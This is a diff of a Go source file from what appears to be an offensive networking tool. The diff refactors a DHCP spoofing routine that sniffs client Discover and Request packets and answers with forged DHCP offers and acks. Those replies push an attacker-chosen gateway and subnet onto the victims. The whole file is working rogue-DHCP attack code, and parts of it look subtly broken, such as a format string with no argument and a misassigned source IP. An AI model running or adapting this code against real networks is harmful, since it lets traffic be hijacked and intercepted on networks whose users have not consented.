@@ -10,36 +10,15 @@ import (
 	"net"
 )
 
-func generatePool(pool, netmask string) ([]net.IP, error) {
-	ip, ipnet, err := net.ParseCIDR(pool + "/" + netmask)
-	if err != nil {
-		return nil, err
-	}
-
-	var ips []net.IP
-	for ip := ip.Mask(ipnet.Mask); ipnet.Contains(ip); incIP(ip) {
-		ips = append(ips, append(net.IP(nil), ip...))
-	}
-	return ips, nil
-}
-
-func incIP(ip net.IP) {
-	for j := len(ip) - 1; j >= 0; j-- {
-		ip[j]++
-		if ip[j] > 0 {
-			break
-		}
-	}
-}
-
 func DHCPSpoofing(pool, mask, gateway, iface string) {
 
-	availableIP, _ := generatePool(pool, mask)
+	availableIP, _ := utils.GeneratePool(pool, mask)
 	newSniffer, _ := sniffer.NewSniffer(iface, "udp and (port 67 or 68)")
 	serverIP := availableIP[len(availableIP)-1]
+
 	defer newSniffer.Stop()
 	go newSniffer.Start()
-
+	fmt.Println("[*] Waiting for DHCP Discover")
 	for {
 		packets := newSniffer.GetPackets()
 		if len(packets) == 0 {
@@ -59,9 +38,9 @@ func DHCPSpoofing(pool, mask, gateway, iface string) {
 					}
 					switch messageType {
 					case layers.DHCPMsgTypeDiscover:
-						DHCPOffer(dhcp, iface, availableIP[0], serverIP, mask, gateway)
+						DHCPOfferAck(dhcp, iface, availableIP[0], serverIP, net.ParseIP(gateway), net.ParseIP(mask), "offer")
 					case layers.DHCPMsgTypeRequest:
-						DHCPAck(dhcp, iface, availableIP[0], serverIP, mask, gateway)
+						DHCPOfferAck(dhcp, iface, availableIP[0], serverIP, net.ParseIP(gateway), net.ParseIP(mask), "ack")
 					}
 				}
 			}
@@ -69,7 +48,7 @@ func DHCPSpoofing(pool, mask, gateway, iface string) {
 	}
 }
 
-func DHCPOffer(dhcp *layers.DHCPv4, iface string, availableIP net.IP, sourceIp net.IP, mask, gateway string) {
+func DHCPOfferAck(dhcp *layers.DHCPv4, iface string, availableIP, sourceIp, gateway, mask net.IP, dhcptype string) {
 
 	ethLayer := packet.EthernetLayer()
 	ethLayer.SetSrcMAC(utils.MacByInt(iface))
@@ -89,11 +68,13 @@ func DHCPOffer(dhcp *layers.DHCPv4, iface string, availableIP net.IP, sourceIp n
 	dhcpLayer := packet.DHCPLayer()
 	dhcpLayer.SetReply()
 	dhcpLayer.SetDstMac(dhcp.ClientHWAddr.String())
-	dhcpLayer.SetDstIP(availableIP.String())
-	dhcpLayer.SetSrcIP(sourceIp.String())
+	dhcpLayer.SetSrcIP(availableIP.String())
 	dhcpLayer.SetXid(dhcp.Xid)
-	dhcpLayer.SetMsgType("offer")
-	dhcpLayer.AddOption("server_id", sourceIp.String())
+	dhcpLayer.SetMsgType(dhcptype)
+	if dhcptype == "ack" {
+		dhcpLayer.SetReply()
+	}
+	dhcpLayer.AddOption("server_id", sourceIp)
 	dhcpLayer.AddOption("subnet_mask", mask)
 	dhcpLayer.AddOption("router", gateway)
 	dhcpLayer.AddOption("lease_time", 1728)
@@ -102,42 +83,6 @@ func DHCPOffer(dhcp *layers.DHCPv4, iface string, availableIP net.IP, sourceIp n
 	dhcpLayer.AddOption("end", 0)
 
 	pkt, _ := packet.CraftPacket(ethLayer.Layer(), ipLayer.Layer(), udpLayer.Layer(), dhcpLayer.Layer())
-	fmt.Printf("[*] Got dhcp DISCOVER from: %s\n [*] Sending OFFER...\n [*] Sending DHCP Offer")
-	communication.Send(pkt, iface)
-}
-
-func DHCPAck(dhcp *layers.DHCPv4, iface string, availableIP net.IP, sourceIp net.IP, mask, gateway string) {
-
-	ethLayer := packet.EthernetLayer()
-	ethLayer.SetSrcMAC(utils.MacByInt(iface))
-	ethLayer.SetDstMAC(dhcp.ClientHWAddr.String())
-	ethLayer.SetEthernetType(layers.EthernetTypeIPv4)
-
-	ipLayer := packet.IPv4Layer()
-	ipLayer.SetSrcIP(sourceIp.String())
-	ipLayer.SetDstIP(availableIP.String())
-	ipLayer.SetProtocol(layers.IPProtocolUDP)
-
-	udpLayer := packet.UDPLayer()
-	udpLayer.SetSrcPort("67")
-	udpLayer.SetDstPort("68")
-	udpLayer.Layer().SetNetworkLayerForChecksum(ipLayer.Layer())
-
-	dhcpLayer := packet.DHCPLayer()
-	dhcpLayer.SetDstMac(dhcp.ClientHWAddr.String())
-	dhcpLayer.SetDstIP(availableIP.String())
-	dhcpLayer.SetSrcIP(sourceIp.String())
-	dhcpLayer.SetXid(dhcp.Xid)
-	dhcpLayer.SetMsgType("ack")
-	dhcpLayer.AddOption("server_id", sourceIp.String())
-	dhcpLayer.AddOption("subnet_mask", mask)
-	dhcpLayer.AddOption("router", gateway)
-	dhcpLayer.AddOption("lease_time", 1728)
-	dhcpLayer.AddOption("renewal_time", 864)
-	dhcpLayer.AddOption("rebind_time", 13824)
-	dhcpLayer.AddOption("end", 0)
-
-	pkt, _ := packet.CraftPacket(ethLayer.Layer(), ipLayer.Layer(), udpLayer.Layer(), dhcpLayer.Layer())
-	fmt.Printf("Sending ACK")
+	fmt.Printf("[*] Got dhcp DISCOVER from: %s\n [*] Sending OFFER...\n [*] Sending DHCP Offer\n")
 	communication.Send(pkt, iface)
 }
